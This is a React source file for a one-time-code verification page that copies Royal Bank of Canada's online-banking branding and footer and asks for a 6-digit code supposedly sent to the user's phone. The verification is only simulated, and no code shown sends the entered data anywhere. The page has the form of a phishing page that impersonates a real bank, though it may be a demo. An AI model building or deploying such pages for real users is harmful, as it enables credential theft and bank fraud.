import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const VerificationPage: React.FC = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleVerify = (e: React.MouseEvent) => {
    e.preventDefault();
    if (code.length < 6) {
      setError('Please enter a valid 6‑digit code.');
      return;
    }
    setLoading(true);
    // Simuler une requête de vérification
    setTimeout(() => {
      setLoading(false);
      navigate('/demo/thank-you');
    }, 1500);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex' }}>
      {/* Left side: branding (identique) */}
      <div style={{
        flex: '1',
        background: '#0051a5',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        color: 'white',
        padding: '20px',
      }}>
        <div style={{ textAlign: 'center' }}>
          {/* Logo SVG (copier depuis demo.tsx) */}
          <svg width="77" height="100" viewBox="0 0 77 100" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ display: 'block', margin: '0 auto' }}>
            {/* ... (même SVG) ... */}
          </svg>
          <h1 style={{ fontSize: '20px', fontWeight: 400, marginTop: '16px' }}>Secure Sign-In</h1>
          <p style={{ fontSize: '14px', fontWeight: 400 }}>RBC Online Banking</p>
        </div>
      </div>

      {/* Right side: verification form */}
      <div style={{
        flex: '1',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '20px',
        backgroundColor: '#fff',
      }}>
        <div style={{ width: '100%', maxWidth: '400px' }}>
          <h2 style={{ fontSize: '1.5rem', fontWeight: 400, marginBottom: '8px' }}>Verify Your Identity</h2>
          <p style={{ fontSize: '0.875rem', color: '#444', marginBottom: '24px' }}>
            A verification code has been sent to your registered phone. Enter it below.
          </p>

          <form onSubmit={(e) => e.preventDefault()} style={{ width: '100%' }}>
            <div style={{ marginBottom: '16px' }}>
              <label htmlFor="code" style={{ fontWeight: 400, fontSize: '1rem' }}>
                Verification Code
              </label>
              <input
                id="code"
                type="text"
                value={code}
                onChange={(e) => {
                  setCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                  setError('');
                }}
                placeholder="6-digit code"
                style={{
                  width: '100%',
                  height: '48px',
                  padding: '0 14px',
                  fontSize: '1rem',
                  border: `1px solid ${error ? '#b91a0e' : '#ccc'}`,
                  borderRadius: '0',
                  outline: 'none',
                  color: '#333',
                  background: 'white',
                }}
                required
              />
              {error && <div style={{ color: '#b91a0e', fontSize: '0.875rem', marginTop: '4px' }}>{error}</div>}
            </div>

            <button
              type="button"
              onClick={handleVerify}
              disabled={loading}
              style={{
                width: '100%',
                padding: '12px 20px',
                backgroundColor: loading ? '#ccc' : '#006ac3',
                color: 'white',
                border: 'none',
                cursor: loading ? 'not-allowed' : 'pointer',
                fontSize: '0.875rem',
                fontWeight: 500,
                textAlign: 'center',
              }}
            >
              {loading ? 'Verifying...' : 'Verify'}
            </button>

            <div style={{ marginTop: '16px' }}>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => { e.preventDefault(); alert('Resend code'); }}>Resend code</a>
            </div>
          </form>

          {/* Footer (simplifié) */}
          <div style={{ marginTop: '24px', borderTop: '1px solid #e0e0e0', paddingTop: '16px', fontSize: '0.75rem', color: '#444' }}>
            <p style={{ margin: '0 0 4px' }}>RBC Online Banking is provided by Royal Bank of Canada.</p>
            <p style={{ margin: '0 0 16px' }}>Royal Bank of Canada Website, © 1995-2026</p>
            <div style={{ display: 'flex', gap: '16px', flexWrap: 'wrap' }}>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => e.preventDefault()}>Legal</a>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => e.preventDefault()}>Accessibility</a>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => e.preventDefault()}>Privacy &amp; Security</a>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => e.preventDefault()}>Advertising &amp; Cookies</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VerificationPage;